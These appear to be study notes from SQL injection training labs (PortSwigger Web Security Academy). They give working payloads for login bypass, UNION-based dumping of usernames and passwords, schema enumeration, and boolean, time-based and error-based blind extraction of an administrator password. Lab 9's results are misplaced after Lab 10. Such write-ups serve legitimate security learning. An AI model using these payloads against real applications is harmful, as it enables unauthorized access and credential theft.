# SQL Injection Notes

## What is SQLi?
A single quote `'` breaks out of a SQL query because it is the string
delimiter. This changes how the database interprets the rest of the
query, allowing injected logic or additional statements to execute.

---

## Lab 1: SQL Injection — Bypassing Filters to Access Hidden Data

**Category:** Basic SQL Injection
**Objective:** Retrieve hidden/unreleased items from the product listing.

### Payload
```sql
' OR 1=1--
```

### Breakdown
- `OR 1=1` makes the WHERE clause always evaluate true, regardless of the
  original filter condition.
- `--` comments out the rest of the original query.

### Result
Query returned all items, including hidden ones.

### Key Takeaway
A single always-true condition can bypass filtering logic entirely when
input isn't sanitized.

---

## Lab 2: SQL Injection — Login Bypass

**Category:** Basic SQL Injection (Authentication Bypass)
**Objective:** Log in without a valid password.

### Payload
```sql
' OR '1'='1'--
```

### Breakdown
- `'1'='1'` is always true, same principle as Lab 1 but applied to a login
  query instead of a filter.
- `--` comments out the password check that would otherwise follow.

### Result
Authenticated without knowing the real password.

### Key Takeaway
Authentication logic built on string-concatenated SQL is trivially
bypassed with a tautology.

---

## UNION Attacks — Core Concepts

**Purpose:** Combine the results of two SELECT statements into one result
set, allowing extraction of data from tables the application never
intended to expose.

**Requirements:**
1. Both queries must return the same number of columns.
2. Corresponding columns must have compatible data types.

**Finding column count:**
```sql
' ORDER BY 1--
' ORDER BY 2--
```
Increment until the query errors — the last successful number is the
column count.

**Extracting data:**
```sql
' UNION SELECT username,password,NULL FROM users--
```

**Why `--` works:** it comments out everything after the injection point,
discarding the remainder of the original query so it doesn't interfere.

---

## Lab 3: SQL Injection — Finding a Column Containing Text

**Category:** UNION-based SQL Injection
**Objective:** Identify a column that accepts string data, to be used for
data extraction in later steps.

### Approach
1. Determined column count by incrementing `ORDER BY` until an error:
```sql
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--
   ' ORDER BY 4--   -- errors here, so 3 columns confirmed
```
2. Tested each column for string compatibility:
```sql
   ' UNION SELECT NULL,'a',NULL--
```
   Column 2 accepted the string without error.

### Result
Confirmed column 2 as string-compatible and displayed the lab's random
value to verify the injection point.

### Key Takeaway
Column count and data type must both be confirmed before attempting real
data extraction — mismatches cause silent failures or errors.

---

## Lab 4: SQL Injection — Retrieving Data with a UNION Attack

**Category:** UNION-based SQL Injection
**Objective:** Extract user credentials and escalate to admin access.

### Payload
```sql
' UNION SELECT username, password FROM users--
```

### Result
Dumped all usernames and passwords, including the administrator's
credentials. Logged in as administrator.

### Key Takeaway
This is the complete UNION SQLi chain in miniature: confirm injection →
extract data → escalate privilege using the leaked credentials.

---

## Lab 5: SQL Injection — Retrieving Multiple Values Within a Single Column

**Category:** UNION-based SQL Injection
**Database:** Oracle
**Objective:** Extract two values (username, password) when the query only
exposes one usable output column.

### Payload
```sql
' UNION SELECT NULL,username||'~'||password FROM users--
```

### Breakdown
- `||` — Oracle's string concatenation operator, joins the two values
  together.
- `~` — separator character, allows the combined string to be split back
  apart visually (e.g. `administrator~s3cure`).
- `NULL` — placeholder for the first column, which isn't used for output.

### Result
Output returned as `administrator~<password>`. Logged in as administrator.

### Key Takeaway
When only one column is usable for output, multiple values can still be
extracted by concatenating them with a distinct separator. Concatenation
syntax is database-specific (`||` on Oracle/PostgreSQL, `CONCAT()` on
MySQL, `+` on SQL Server).

---

## Lab 6: SQL Injection — Querying Database Type and Version (MySQL/MSSQL)

**Category:** UNION-based SQL Injection
**Database:** MySQL / Microsoft SQL Server
**Objective:** Retrieve the database version string.

### Approach
1. Confirmed column count and text compatibility using a probe payload:
```sql
   ' UNION SELECT 'abc','def'#
```
2. Replaced the probe values with `@@version`, a built-in system variable
   available on both MySQL and SQL Server, to extract the version string
   directly.

### Payload
```sql
' UNION SELECT @@version,NULL#
```

### Result
Database returned: `8.0.42-0ubuntu0.20.04.1`

### Notes / Gotchas
- Typing `#` directly into a browser address bar gets interpreted as a URL
  fragment and is stripped before the request is sent, breaking the query.
- Fix: URL-encode as `%23`, or use the `-- ` (double-dash + space) comment
  style, which browsers don't touch.

### Key Takeaway
`@@version` works cross-database (MySQL + MSSQL), making it a fast way to
fingerprint the backend without needing separate payloads per DB type.

## Lab 7: SQL Injection — Listing Database Contents on Non-Oracle Databases

**Category:** UNION-based SQL Injection (Database Enumeration)
**Database:** Non-Oracle (MySQL/SQL Server/PostgreSQL — uses information_schema)
**Objective:** Discover the credentials table/columns and log in as administrator.

### Approach
Multi-stage recon before extraction — table/column names weren't given
upfront, unlike earlier labs.

1. Confirmed 2 text-compatible columns:
```sql
   ' UNION SELECT 'abc','def'--
```
2. Listed all tables in the database:
```sql
   ' UNION SELECT table_name, NULL FROM information_schema.tables--
```
3. Identified the credentials table (e.g. `users_abcdef`), then listed its
   columns:
```sql
   ' UNION SELECT column_name, NULL FROM information_schema.columns
   WHERE table_name='users_abcdef'--
```
4. Identified username/password columns, then extracted all credentials:
```sql
   ' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
```

### Result
Retrieved administrator's password from the dumped table, logged in
successfully.

### Key Takeaway
When table/column names are unknown, `information_schema.tables` and
`information_schema.columns` let you enumerate the entire schema before
extraction — this recon step is only needed on non-Oracle databases,
since Oracle uses `all_tables` / `all_tab_columns` instead.

## Lab 8: Blind SQL Injection with Conditional Responses

**Category:** Blind SQL Injection (Boolean-based)
**Database:** Oracle-style backend (PortSwigger Web Security Academy)
**Objective:** Exploit a blind SQLi vulnerability in the `TrackingId` cookie to extract the administrator's password character-by-character using only the presence/absence of a "Welcome back" message as a boolean oracle, then log in as administrator.

### Payload
```sql
-- Confirm boolean oracle
TrackingId=xyz' AND '1'='1
TrackingId=xyz' AND '1'='2

-- Confirm table/user existence
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

-- Determine password length
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a

-- Extract each character via Burp Intruder (Cluster bomb)
TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
```

### Breakdown
- Used Burp Repeater to confirm a working boolean oracle — `'1'='1'` shows "Welcome back", `'1'='2'` doesn't.
- Confirmed the `users` table and `administrator` user exist via single-character subquery checks.
- Stepped `LENGTH(password)>N` up from Repeater until the condition flipped false — password is 20 characters.
- Sent the `SUBSTRING` request to Burp Intruder, set two payload positions (offset 1–20, character a-z0-9), attack type **Cluster bomb**.
- Set a Grep - Match rule for "Welcome back" to flag true conditions per row.
- Read the matching character off each offset row in the results grid.

### Result
Extracted password: `l1mw6ekepq9ay1g0idf4`. Logged in as `administrator` → lab solved.

### Key Takeaway
When manually reading results off a Burp Intruder grid, ambiguous characters (`0` vs `o`, `1` vs `l`, `5` vs `S`) will silently break your login attempt and look like a failed exploit even though the extraction was correct. Copy/export the payload values directly rather than eyeballing them off the table.

---

## Lab 9: Visible error-based SQL injection

**Category:** SQL Injection — Error-Based
**Database:** Likely PostgreSQL (based on `invalid input syntax for type integer` error)
**Objective:** Leak the `administrator` user's password via verbose SQL error messages returned by the app, then log in as them.

### Payload

TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--


### Approach
- Injected into the `TrackingId` cookie value via Burp Repeater
- Confirmed injection with a single `'` → verbose error disclosed the full query, showing the input lands inside a quoted string
- Commented out the trailing query fragment with `--` to get back to a valid query
- Forced a type-mismatch error by wrapping a subquery in `CAST(... AS int)` — since usernames/passwords aren't integers, the DB throws an error that **includes the actual value** in the message
- Hit a character limit once the subquery got long, so dropped the original cookie value to free up space
- Added `LIMIT 1` after getting a "more than one row returned" error, since `CAST` only accepts a single scalar
- Error message leaked `administrator` as the username, then reused the same trick on the `password` column

## Lab 10: Blind SQL injection with time delays and information retrieval

**Category:** Blind SQL Injection (Time-based)
**Database:** PostgreSQL
**Objective:** Exploit a blind SQLi vulnerability in the `TrackingId` cookie to extract the administrator's password using conditional time delays, then log in.

### Payload
```sql
-- Confirm injection point works
x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

-- Confirm password length (iterate N)
x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>N)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

-- Extract each character (Burp Intruder, position N, payload set a-z0-9)
x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,N,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

### Approach
- App gives no visible output or error difference — the only observable signal is response time, so this is true blind (time-based) SQLi
- Stacked query (`;SELECT...`) piggybacks a conditional `CASE WHEN` onto the original query
- `pg_sleep(10)` vs `pg_sleep(0)` acts as a binary oracle: 10s delay = condition TRUE, instant = FALSE
- Confirmed the `administrator` user exists, then found password length via incremental `LENGTH(password)>N` checks (20 chars)
- Used Burp Intruder with `§a§` payload markers on `SUBSTRING(password,N,1)` to brute-force each character position (charset: `a-z0-9`)
- Critical config: set Intruder's Resource Pool to 1 concurrent request — parallel requests would desync the timing signal and give false positives
- Repeated across all 20 offsets, reading the "Response received" column for the ~10,000ms outlier each round

### Result
Extracted the full 20-character administrator password character-by-character, logged in via `/my-account`, lab marked Solved.

### Key Takeaway
Time-based blind SQLi is the fallback oracle when there's zero content/error differential — you're using the DB's own execution delay as your only channel out. It's slow and Intruder-heavy, which is exactly why a real engagement reaches for `sqlmap --technique=T` instead of doing this by hand at scale. Also worth remembering: this only works because stacked queries are allowed here — Postgres via most web frameworks (Django, Rails) blocks multi-statement execution by default.

### Result
Extracted the administrator's password directly from the database's own error output, logged in, lab solved.

### Key Takeaway
When an app suppresses query results but doesn't handle DB errors gracefully, you can turn the **error message itself into an oracle** — `CAST()` is a reliable way to force a type-conversion error that echoes back arbitrary data, one row at a time.
